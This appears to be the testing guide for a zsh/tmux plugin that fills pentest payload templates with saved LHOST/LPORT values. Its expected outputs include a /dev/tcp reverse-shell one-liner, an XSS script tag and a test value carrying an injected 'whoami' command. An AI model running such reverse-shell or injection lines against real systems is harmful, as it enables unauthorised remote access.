# Testing

All commands below assume the repo is at:

```text
/mnt/d/4_L-Repo/0_Developing/dev-tui-jj-kali
```

## Syntax Check

Run from repo root:

```zsh
zsh -n jj.plugin.zsh
zsh -n lib/*.zsh
```

## Local Plugin Load Check

This does not require tmux:

```zsh
cd /mnt/d/4_L-Repo/0_Developing/dev-tui-jj-kali
zsh -fc 'source ./jj.plugin.zsh && type jj && type jjp && print $JJ_PAYLOAD_DIR'
```

Expected result:

```text
jj is a shell function
jjp is a shell function
/mnt/d/4_L-Repo/0_Developing/dev-tui-jj-kali/payloads
```

## Single Pane tmux Smoke Test

Run from outside or inside tmux. It creates an isolated session named
`codex-jj-test`.

```zsh
tmux kill-session -t codex-jj-test 2>/dev/null || true
tmux new-session -d -s codex-jj-test -x 120 -y 40 zsh
tmux send-keys -t codex-jj-test "cd /mnt/d/4_L-Repo/0_Developing/dev-tui-jj-kali" Enter
tmux send-keys -t codex-jj-test "source ./jj.plugin.zsh" Enter
tmux send-keys -t codex-jj-test "jjs LHOST 127.0.0.1" Enter
tmux send-keys -t codex-jj-test "jjs LPORT 4444" Enter
tmux send-keys -t codex-jj-test "jjs DOMAIN example.test" Enter
tmux send-keys -t codex-jj-test "jjv" Enter
tmux send-keys -t codex-jj-test "jjv host" Enter
tmux send-keys -t codex-jj-test "jjl" Enter
tmux send-keys -t codex-jj-test "FZF_DEFAULT_OPTS='--filter=sh-tcp' JJ_CLIP_CMD='tmux load-buffer -' jjp linux" Enter
sleep 2
tmux capture-pane -t codex-jj-test -p -S -200
tmux show-buffer
tmux kill-session -t codex-jj-test
```

Expected payload:

```text
/bin/sh -i >/dev/tcp/127.0.0.1/4444 2>&1 0>&1
```

Expected used variables:

```text
lhost used: 127.0.0.1
lport used: 4444
```

## Cross Pane tmux Test

This verifies that `jjp` reads tmux session values directly, without requiring
`jjl` in the rendering pane.

```zsh
tmux kill-session -t codex-jj-crosspane 2>/dev/null || true
tmux new-session -d -s codex-jj-crosspane -x 120 -y 40 zsh
tmux split-window -t codex-jj-crosspane zsh
tmux send-keys -t codex-jj-crosspane:0.0 "cd /mnt/d/4_L-Repo/0_Developing/dev-tui-jj-kali" Enter
tmux send-keys -t codex-jj-crosspane:0.0 "source ./jj.plugin.zsh" Enter
tmux send-keys -t codex-jj-crosspane:0.0 "jjs LHOST 10.10.10.10" Enter
tmux send-keys -t codex-jj-crosspane:0.0 "jjs LPORT 9001" Enter
tmux send-keys -t codex-jj-crosspane:0.1 "cd /mnt/d/4_L-Repo/0_Developing/dev-tui-jj-kali" Enter
tmux send-keys -t codex-jj-crosspane:0.1 "source ./jj.plugin.zsh" Enter
tmux send-keys -t codex-jj-crosspane:0.1 "echo pane2-shell-before:\$LHOST" Enter
tmux send-keys -t codex-jj-crosspane:0.1 "FZF_DEFAULT_OPTS='--filter=sh-tcp' JJ_CLIP_CMD='tmux load-buffer -' jjp linux" Enter
sleep 2
tmux capture-pane -t codex-jj-crosspane:0.1 -p -S -120
tmux kill-session -t codex-jj-crosspane
```

Expected signs:

```text
pane2-shell-before:
/bin/sh -i >/dev/tcp/10.10.10.10/9001 2>&1 0>&1
lhost used: 10.10.10.10
lport used: 9001
```

## Special Character Copy Test

This verifies that rendered payloads are piped into tmux buffer through stdin
and are not broken by common shell metacharacters.

```zsh
tmux kill-session -t codex-jj-special 2>/dev/null || true
tmux new-session -d -s codex-jj-special -x 120 -y 40 zsh
tmux send-keys -t codex-jj-special "cd /mnt/d/4_L-Repo/0_Developing/dev-tui-jj-kali" Enter
tmux send-keys -t codex-jj-special "source ./jj.plugin.zsh" Enter
tmux send-keys -t codex-jj-special "jjs DOMAIN \"a b/c;whoami & test\"" Enter
tmux send-keys -t codex-jj-special "FZF_DEFAULT_OPTS='--filter=basic-alert' JJ_CLIP_CMD='tmux load-buffer -' jjp xss" Enter
sleep 2
tmux capture-pane -t codex-jj-special -p -S -120
tmux show-buffer
tmux kill-session -t codex-jj-special
```

Expected buffer:

```text
<script>alert('a b/c;whoami & test')</script>
```

## Variable Guard Test

```zsh
tmux kill-session -t codex-jj-vars 2>/dev/null || true
tmux new-session -d -s codex-jj-vars -x 120 -y 30 zsh
tmux send-keys -t codex-jj-vars "cd /mnt/d/4_L-Repo/0_Developing/dev-tui-jj-kali" Enter
tmux send-keys -t codex-jj-vars "source ./jj.plugin.zsh" Enter
tmux send-keys -t codex-jj-vars "jjs GOOD_NAME ok" Enter
tmux send-keys -t codex-jj-vars "jjv good" Enter
tmux send-keys -t codex-jj-vars "jj unset GOOD_NAME" Enter
tmux send-keys -t codex-jj-vars "jjv good" Enter
tmux send-keys -t codex-jj-vars "jj set 'BAD-NAME' value" Enter
sleep 2
tmux capture-pane -t codex-jj-vars -p -S -100
tmux kill-session -t codex-jj-vars
```

Expected signs:

```text
GOOD_NAME=ok
unset GOOD_NAME
jj: invalid variable name: BAD-NAME
```

## Interactive Variable Display Test

This uses fzf filter mode to verify that `jji` can load variables while the TUI
candidate text does not expose the `JJ_` prefix. Loaded shell variables should
also be unprefixed.

```zsh
tmux kill-session -t codex-jj-jji 2>/dev/null || true
tmux new-session -d -s codex-jj-jji -x 120 -y 30 zsh
tmux send-keys -t codex-jj-jji "cd /mnt/d/4_L-Repo/0_Developing/dev-tui-jj-kali" Enter
tmux send-keys -t codex-jj-jji "source ./jj.plugin.zsh" Enter
tmux send-keys -t codex-jj-jji "jjs LHOST 172.16.1.10" Enter
tmux send-keys -t codex-jj-jji "unset LHOST JJ_LHOST" Enter
tmux send-keys -t codex-jj-jji "FZF_DEFAULT_OPTS='--filter=LHOST' jji" Enter
tmux send-keys -t codex-jj-jji "echo loaded:\$LHOST" Enter
sleep 2
tmux capture-pane -t codex-jj-jji -p -S -100
tmux kill-session -t codex-jj-jji
```

Expected signs:

```text
loaded 1 variable(s)
loaded:172.16.1.10
```

## Interactive Set Test

This verifies `jjs` with no arguments. `JJ_SET_VAR_FILTER` and
`JJ_SET_VALUE_FILTER` make the two fzf steps deterministic for testing.

```zsh
tmux kill-session -t codex-jj-jjs-filter 2>/dev/null || true
tmux new-session -d -s codex-jj-jjs-filter -x 120 -y 35 zsh
tmux send-keys -t codex-jj-jjs-filter "cd /mnt/d/4_L-Repo/0_Developing/dev-tui-jj-kali" Enter
tmux send-keys -t codex-jj-jjs-filter "source ./jj.plugin.zsh" Enter
tmux send-keys -t codex-jj-jjs-filter "JJ_SET_VAR_FILTER=LHOST JJ_SET_VALUE_FILTER=192.0.2.10 jjs" Enter
tmux send-keys -t codex-jj-jjs-filter "jjv host" Enter
tmux send-keys -t codex-jj-jjs-filter "echo loaded:\$LHOST" Enter
tmux send-keys -t codex-jj-jjs-filter "echo hidden:\$JJ_LHOST" Enter
sleep 2
tmux capture-pane -t codex-jj-jjs-filter -p -S -120
tmux kill-session -t codex-jj-jjs-filter
```

Expected signs:

```text
LHOST=192.0.2.10
loaded:192.0.2.10
hidden:
```

## Manual Interactive Test

Inside an existing tmux session:

```zsh
cd /mnt/d/4_L-Repo/0_Developing/dev-tui-jj-kali
source ./jj.plugin.zsh

jjs LHOST 192.168.45.192
jjs LPORT 443
jjv
jji
jjp linux
```
